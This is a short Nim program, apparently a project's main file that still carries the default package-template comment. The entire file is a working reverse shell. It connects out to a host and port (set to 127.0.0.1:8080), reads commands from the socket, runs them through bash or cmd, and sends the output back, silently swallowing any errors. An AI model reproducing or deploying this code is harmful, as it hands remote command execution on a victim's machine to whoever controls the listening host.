# This is just an example to get you started. A typical binary package
# uses this file as the main entry point of the application.

import net, osproc, strutils

var
  LHOST = "127.0.0.1"
  LPORT = Port(8080)
  sock = newSocket()

try:
  sock.connect(LHOST, LPORT)
  while true:
    var cmd = sock.recvLine()
    if cmd == "exit":
      break
    else:
      case cmd.split(" ")[0]:
        of "cmdexec":
          cmd = join(cmd.split(" ")[1 .. len(cmd.split(" ")) - 1], " ")
        of "linexec":
          cmd = "bash -c \"" & join(cmd.split(" ")[1 .. len(cmd.split(" ")) - 1], " ") & "\""
        of "winexec":
          cmd = "cmd /c \"" & join(cmd.split(" ")[1 .. len(cmd.split(" ")) - 1], " ") & "\""

      let result = execProcess(cmd)
      sock.send(result)
except:
  discard
finally:
  sock.close